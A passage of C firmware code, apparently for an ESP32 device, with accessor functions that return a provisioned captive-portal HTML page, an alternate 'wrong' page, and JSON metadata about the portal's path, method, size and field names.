             s_portal_path[0] ? s_portal_path : "/",
             (unsigned)s_portal_field_count,
             (unsigned)strlen(s_portal_html));
    return ESP_OK;
}

bool ota_provision_has_portal(void)
{
    return s_portal_html != NULL && s_portal_html[0] != '\0';
}

const char *ota_provision_get_portal_html(void)
{
    return s_portal_html ? s_portal_html : "";
}

const char *ota_provision_get_portal_wrong_html(void)
{
    return s_portal_wrong_html ? s_portal_wrong_html : "";
}

cJSON *ota_provision_get_portal_meta_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;
    cJSON_AddBoolToObject(root, "ready", ota_provision_has_portal());
    cJSON_AddBoolToObject(root, "values_retained", false);
    cJSON_AddStringToObject(root, "path", s_portal_path[0] ? s_portal_path : "");
    cJSON_AddStringToObject(root, "method", s_portal_method[0] ? s_portal_method : "");
    cJSON_AddNumberToObject(root, "html_bytes",
                            s_portal_html ? (double)strlen(s_portal_html) : 0);
    cJSON *fields = cJSON_AddArrayToObject(root, "fields");
    for (uint8_t i = 0; fields && i < s_portal_field_count; i++) {
        cJSON_AddItemToArray(fields, cJSON_CreateString(s_portal_fields[i]));
    }
    return root;
}
